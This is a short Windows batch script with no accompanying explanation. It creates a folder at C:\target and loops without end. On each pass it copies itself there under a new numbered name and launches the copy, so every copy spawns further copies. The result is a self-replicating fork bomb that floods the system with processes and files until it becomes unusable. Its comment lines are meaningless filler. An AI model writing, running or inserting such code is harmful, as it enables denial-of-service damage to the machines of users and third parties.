@echo off
setlocal enabledelayedexpansion

set "target=C:\target"

rem asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf
if not exist "%target%" mkdir "%target%"

rem kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk
set /a count=1

:loop
rem qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
set "name=copy_%count%.bat"

rem llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll
copy "%~f0" "%target%\%name%" >nul

rem dddddddddddddddddddddd
start "" "%target%\%name%"

echo copied and executed: %target%\%name%

rem gggggggggggggggggggggggggggggggggggggg
set /a count+=1

goto loop

endlocal